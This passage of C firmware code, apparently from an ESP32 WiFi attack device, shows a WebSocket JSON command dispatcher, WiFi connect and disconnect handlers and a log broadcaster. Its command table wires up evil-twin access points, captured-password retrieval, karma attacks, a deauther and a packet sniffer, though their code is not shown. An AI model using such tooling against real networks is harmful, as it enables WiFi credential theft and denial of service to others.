    if (cJSON_IsString(j_password)) strlcpy(password, j_password->valuestring, sizeof(password));

    cJSON_Delete(json);

    if(wifi_connect(ssid, password) != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to connect to WiFi");
        return ESP_FAIL;
    }

    api_send_status_frame(req, "ok", "Connection Attempted");
    return ESP_OK;
}


static esp_err_t api_wifi_disconnect(ws_frame_req_t *req)
{
    if(esp_wifi_disconnect() != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to disconnect from WiFi");
        return ESP_FAIL;
    }
    api_send_status_frame(req, "ok", "Disconnected from WiFi");
    return ESP_OK;
}


static const api_cmd_t api_cmd_list[] = {
    { API_GET_STATUS, api_get_status },
    { API_SET_AP_SETTINGS, api_admin_set_ap_settings },
    { API_GET_AP_SETTINGS, api_admin_get_ap_settings },
    { API_WIFI_SCAN, api_wifi_scan },
    { API_START_EVILTWIN, api_start_evil_twin },
    { API_STOP_EVILTWIN, api_stop_evil_twin },
    { API_GET_EVILTWIN_TARGET, api_get_evlitwin_target },
    { API_CHECK_INPUT_PASSWORD, api_check_input_password },
    { API_GET_PASSWORDS, api_get_passwords },
    { API_KARMA_ATTACK_SCAN, api_karma_scan },
    { API_GET_KARMA_PROBES, api_get_karma_probes },
    { API_KARMA_ATTACK_START, api_karma_set_target },
    { API_DEAUTHER_START, api_deauther_start },
    { API_DEAUTHER_STOP, api_deauther_stop },
    { API_START_RAW_SNIFFER, api_start_raw_sniffer },
    { API_STOP_RAW_SNIFFER, api_stop_raw_sniffer },
    { API_GET_RECON_AP_LIST, api_get_recon_data_aps },
    { API_GET_RECON_CLIENT_LIST, api_get_recon_data_clients },
    { API_WIFI_CONNECT, api_wifi_connect },
    { API_WIFI_DISCONNECT, api_wifi_disconnect },
};


void http_api_parse(ws_frame_req_t *req)
{
    cJSON *root = cJSON_Parse(req->payload);
    if (root == NULL) {
        ESP_LOGD(TAG, "Invalid JSON received: %s", req->payload);
        return;
    }

    cJSON *jcmd = cJSON_GetObjectItemCaseSensitive(root, "cmd");
    if (!cJSON_IsNumber(jcmd)) {
        ESP_LOGE(TAG, "Missing/invalid cmd");
        cJSON_Delete(root);
        return;
    }

    cJSON *jid = cJSON_GetObjectItemCaseSensitive(root, "req_id");
    if (cJSON_IsNumber(jid)) {
        req->req_id = jid->valueint; 
    } else {
        req->req_id = 0;
    }

    int cmd = jcmd->valueint;
    bool handled = false;
    for (size_t i = 0; i < sizeof(api_cmd_list) / sizeof(api_cmd_t); i++) {
        if (api_cmd_list[i].cmd == cmd) {
            api_cmd_list[i].handler(req);
            handled = true;
            break;
        }
    }

    if (!handled) {
        ESP_LOGW(TAG, "Unknown command: %d", cmd);
        api_send_status_frame(req, "error", "Unknown command");
    }

    cJSON_Delete(root);
}


void ws_log(const char *level, const char *format, ...)
{
    char buffer[256];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return;

    cJSON_AddStringToObject(root, "type", "log");
    cJSON_AddStringToObject(root, "level", level);
    cJSON_AddStringToObject(root, "msg", buffer);
    char *payload = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (payload == NULL) return;

    ws_frame_req_t cmd;
    cmd.hd = get_web_server_handle(); 
    cmd.fd = -1; //BROADCAST
    cmd.payload = payload;
    cmd.len = strlen(payload);
    cmd.need_free = true;

    if (ws_send_broadcast_to_queue(&cmd) != ESP_OK) {
        free(payload);
    }
}